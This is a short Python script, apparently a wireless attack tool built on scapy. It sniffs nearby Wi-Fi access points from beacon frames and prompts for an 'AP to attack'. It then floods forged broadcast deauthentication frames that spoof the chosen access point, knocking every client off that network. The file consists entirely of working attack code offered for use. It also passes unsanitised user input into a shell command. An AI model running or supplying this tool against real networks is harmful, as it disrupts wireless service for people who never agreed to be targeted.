from scapy.all import *
import os
ap_list = []
no_ap=0
broadcast="ff:ff:ff:ff:ff:ff"
def PacketHandler(pkt):
	global no_ap
	if pkt.haslayer(Dot11):
		if pkt.type==0 and pkt.subtype==8 :
			if pkt.addr2 not in ap_list:
				ap_list.append(pkt.addr2)
				print "%d AP MAC:%s with SSID: %s" %(no_ap,pkt.addr2,pkt.info)
				no_ap=no_ap+1
def deauth_ap(bssid,number):
	packet=RadioTap()/Dot11(type=0,subtype=12,addr1=broadcast,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=5)
        packet.show()
	for n in range(number):
		sendp(packet)

def main():
	interface=raw_input("Name of interface : ")
	cnt=input("Number of packet to sniff : ")
	channel=input("Sniffing Channel : ")
        for channel in range(channel,channel+1):
		os.system("iwconfig "+interface+" channel "+str(channel))
		#print "Snifiing on channel "+str(channel)	
		sniff(iface=interface,prn=PacketHandler,count=cnt)
                choice_ap=input("AP to attack : ")
		attack_no=input("number of packet to attack : ")
		print("Attack to "+ap_list[choice_ap])
		deauth_ap(ap_list[choice_ap],attack_no)
	

if __name__== "__main__":
	main()
